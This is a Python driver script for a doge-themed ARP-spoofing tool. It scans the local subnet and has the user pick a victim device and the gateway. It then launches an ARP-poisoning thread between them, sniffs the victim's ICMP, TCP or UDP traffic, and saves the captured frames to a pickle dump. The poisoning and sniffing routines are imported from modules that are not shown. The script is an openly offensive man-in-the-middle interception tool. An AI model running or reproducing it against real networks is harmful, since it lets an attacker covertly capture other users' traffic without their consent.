import os
import sys
from colorama import init, Fore, Back
import threading
from sniffer import sniff
from poisoner import *
import pickle

init()

def print_title():
    os.system('clear')
    print(" _       ___           ____                 ")
    print("| |     / (_)_______  / __ \\____  ____ ____ ")
    print("| | /| / / / ___/ _ \/ / / / __ \\/ __ `/ _ \\")
    print("| |/ |/ / / /  /  __/ /_/ / /_/ / /_/ /  __/")
    print("|__/|__/_/_/   \___/_____/\____/\__, /\___/ ")
    print("                               /____/       ")
    print()
    print(Back.WHITE + Fore.BLACK, end="")
    print("          ▄              ▄      ")
    print("         ▌▒█           ▄▀▒▌     ")
    print("         ▌▒▒█        ▄▀▒▒▒▐     ")
    print("        ▐▄█▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐     ")
    print("      ▄▄▀▒▒▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐     ")
    print("    ▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌     ")
    print("   ▐▒▒▒▄▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄▒▌    ")
    print("   ▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐    ")
    print("  ▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌   ")
    print("  ▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌   ")
    print(" ▌▒▒▒▄██▄▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▐   ")
    print(" ▐▒▒▐▄█▄█▌▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▒▒▌  ")
    print(" ▐▒▒▐▀▐▀▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▐   ")
    print("  ▌▒▒▀▄▄▄▄▄▄▒▒▒▒▒▒▒▒░▒░▒░▒▒▒▌   ")
    print("  ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒▒▄▒▒▐    ")
    print("   ▀▄▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒▄▒▒▒▒▌    ")
    print("     ▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀     ")
    print("       ▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀       ")
    print("          ▀▀▀▀▀▀▀▀▀▀▀▀          ")
    print(" WoW Much Packets, Very Network ")
    print(Fore.RESET + Back.RESET, end="")
    print()


def main():
    
    print_title()
    adapter = adapter_selection()
    ip, mac, netmask, scan_range = get_adapter_info(adapter)
    ip_list = get_devices(scan_range)
    target, gateway = get_targets(ip_list)

    input("Hit Enter to Get Started...")
    os.system("clear")
    # Big booty multi-threading
    arp_thread = threading.Thread(target=arp_poison, args=(target, gateway,))
    arp_thread.start()

    protocol_choices = [inquirer.Checkbox('protocols', message="Choose one or more Protocols to sniff out (use space to toggle selection)", choices=['ICMP', 'TCP', 'UDP'])]
    protocols = inquirer.prompt(protocol_choices)['protocols']

    protocol_map = {'ICMP': 1, 'TCP': 6, 'UDP': 17}

    protocols = [protocol_map[x] for x in protocols]

    if not len(protocols):
        print("No selection was given, defaulting to ICMP")
        protocols = [1]

    packets = sniff(target['IP'], protocols)
    print("Stopping Main Thread")
    arp_thread.stop = True
    arp_thread.join()

    if packets != None:
        print("Dumping Frames to dogescan.dump...")
        with open('dogescan.dump', 'wb') as f:
            pickle.dump(packets, f)
    
    print(":boop:")

    
if __name__=="__main__":
    if not os.geteuid() == 0:
        sys.exit("Only root can run this script")
    main()